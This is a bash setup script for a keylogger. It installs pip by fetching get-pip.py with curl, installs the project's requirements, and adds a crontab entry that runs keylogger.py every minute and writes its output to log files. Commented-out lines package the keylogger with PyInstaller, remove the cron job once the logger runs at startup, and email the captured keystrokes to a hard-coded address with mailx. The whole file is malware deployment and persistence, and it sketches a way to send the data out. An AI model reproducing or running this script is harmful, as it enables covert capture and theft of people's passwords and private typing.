#!/bin/bash

cd

operating_system=`python -c "import platform; print(platform.system())"`


if [ $operating_system = Linux ];
    then filepath="$(find -iname autorun_mac.command)"
elif [ $operating_system == Darwin ];
    then filepath="$(mdfind -name autorun_mac.command)"
fi


path="${filepath/autorun_mac.command}"
path="${path/./$(pwd)}"


###################
### install pip ###
###################

py_version="$(which python3)"

curl -O https://bootstrap.pypa.io/get-pip.py
"$py_version" get-pip.py
rm get-pip.py
"$py_version" -m pip install -r "$path"../requirements.txt
# "$py_version" -m PyInstaller keylogger.py --onefile --hidden-import=pynput.keyboard._xorg --hidden-import=pynput.mouse._xorg --hidden-import=pynput.keyboard._win32 --hidden-import=pynput.mouse._win32

#####################################################
### add crontab to run the keylogger every minute ###
#####################################################

crontab_command="* * * * * cd ${path} && "$py_version" keylogger.py >> ../logs/keylogs/keylog_cron_outputs/keylog_outputs.txt 2>> ../logs/keylogs/keylog_cron_errors/keylog_errors.txt"

crontab -l 2>/dev/null| cat - <(echo "$crontab_command") | crontab -

# sleep 90 # sleep for 90 seconds, 30 seconds before the second call of the keylogger file

# crontab -u $USER -l | grep -v "$crontab_command" | crontab -u $USER - # rm cronjob after the script is part of the autorun in the OS
# echo hi.tmp | mailx -s "keylogs $(date)" -r sender_email@gmail.com receiver_email@gmail.com

